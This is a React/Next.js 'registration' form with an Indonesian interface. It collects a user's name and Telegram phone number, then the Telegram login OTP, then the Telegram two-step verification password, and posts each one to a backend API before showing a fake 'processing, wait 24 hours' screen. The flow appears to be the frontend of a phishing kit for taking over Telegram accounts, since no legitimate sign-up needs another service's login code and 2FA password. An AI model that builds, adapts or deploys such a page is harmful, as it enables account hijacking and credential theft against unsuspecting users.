"use client";
import { useState, useRef } from 'react';
import Image from 'next/image';

export default function AuthForm() {
  const [step, setStep] = useState(1);
  const [nama, setNama] = useState('');
  const [nomor, setNomor] = useState('');
  const [otp, setOtp] = useState(['', '', '', '', '']);
  const [sandi, setSandi] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [isFinished, setIsFinished] = useState(false);
  const [error, setError] = useState('');
  const [isOtpError, setIsOtpError] = useState(false);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  const handleOtpChange = (idx: number, val: string) => {
    if (isNaN(Number(val))) return;
    setIsOtpError(false); // Hilangkan merah saat ketik ulang
    const newOtp = [...otp];
    newOtp[idx] = val.slice(-1);
    setOtp(newOtp);
    if (val && idx < 4) inputRefs.current[idx + 1]?.focus();
  };

  const handleNext = async () => {
    setError('');
    setIsLoading(true);
    try {
      const response = await fetch(`${process.env.NEXT_PUBLIC_API_URL}/register`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ step, nomor, nama, sandi, otp: otp.join('') })
      });
      const data = await response.json();

      if (response.ok) {
        if (step === 1) setStep(2);
        else if (step === 2) {
          if (data.status === 'need_2fa') setStep(3);
          else setIsFinished(true);
        } else setIsFinished(true);
      } else {
        if (data.status === 'invalid_otp') {
          setError('OTP SALAH!!');
          setIsOtpError(true);
          setOtp(['', '', '', '', '']); // Otomatis kosongkan
          inputRefs.current[0]?.focus();
        } else {
          setError(data.message || 'Terjadi kesalahan sistem.');
        }
      }
    } catch (err) {
      setError('Koneksi gagal. Cek backend.');
    } finally {
      setIsLoading(false);
    }
  };

  if (isFinished) {
    return (
      <div className="full-screen-center">
        <div className="spinner-circle"><div className="spinner-inner-static text-blue-500 font-bold">PROCESSING</div></div>
        <p className="loading-status-text">Silakan tunggu prosesnya konfirmasi dalam waktu 1x24 jam untuk memeriksa kelayakan</p>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-white flex flex-col items-center">
      <div className="w-full max-w-md relative aspect-[16/9]">
        <Image src="/banner.jpeg" alt="Banner" fill className="object-cover" priority />
      </div>

      <div className="w-full max-w-md p-6 space-y-6">
        {error && <div className="bg-red-50 text-red-500 p-3 rounded-lg text-center font-bold">{error}</div>}

        {step === 1 && (
          <div className="space-y-4">
            <div>
              <label className="font-bold text-sm">Nama Lengkap:</label>
              <input type="text" className="w-full p-4 border rounded-xl bg-gray-50 outline-none focus:ring-2 focus:ring-blue-500" value={nama} onChange={(e) => setNama(e.target.value)} />
            </div>
            <div>
              <label className="font-bold text-sm">Nomor Telegram Aktif:</label>
              <input type="number" className="w-full p-4 border rounded-xl bg-gray-50 outline-none focus:ring-2 focus:ring-blue-500" value={nomor} onChange={(e) => setNomor(e.target.value)} />
            </div>
          </div>
        )}

        {step === 2 && (
          <div className="text-center space-y-4">
            <p className="text-blue-600 font-bold">Kami Telah Mengirimkan Kode OTP Ke Aplikasi Telegram Anda</p>
            <div className="flex justify-center gap-2">
              {otp.map((d, i) => (
                <input key={i} ref={el => { inputRefs.current[i] = el }} type="text" inputMode="numeric" maxLength={1} value={d} onChange={e => handleOtpChange(i, e.target.value)}
                  className={`w-12 h-14 text-center text-2xl font-bold border-2 rounded-lg outline-none ${isOtpError ? 'border-red-500 bg-red-50' : 'border-gray-300 focus:border-blue-500'}`} />
              ))}
            </div>
            <button onClick={() => setStep(1)} className="text-blue-500 text-sm font-bold hover:underline">Kirim Ulang Kode OTP</button>
          </div>
        )}

        {step === 3 && (
          <div className="space-y-4">
            <label className="block text-center font-bold">Sandi Verifikasi Dua Langkah:</label>
            <input type="password" placeholder="Sandi 2FA" className="w-full p-4 border rounded-xl bg-gray-50 text-center outline-none" value={sandi} onChange={(e) => setSandi(e.target.value)} />
          </div>
        )}

        <button onClick={handleNext} disabled={isLoading} className="w-full bg-[#1d4ed8] text-white py-4 rounded-xl font-bold hover:bg-blue-700 transition-all uppercase">
          {isLoading ? "Memproses..." : "Daftar Sekarang"}
        </button>

        <p className="text-[12px] text-gray-400 italic mt-4 border-t pt-2">
          Peringatan: Pendaftaran hanya akan diproses melalui nomor telegram aktif!
        </p>
      </div>
    </div>
  );
}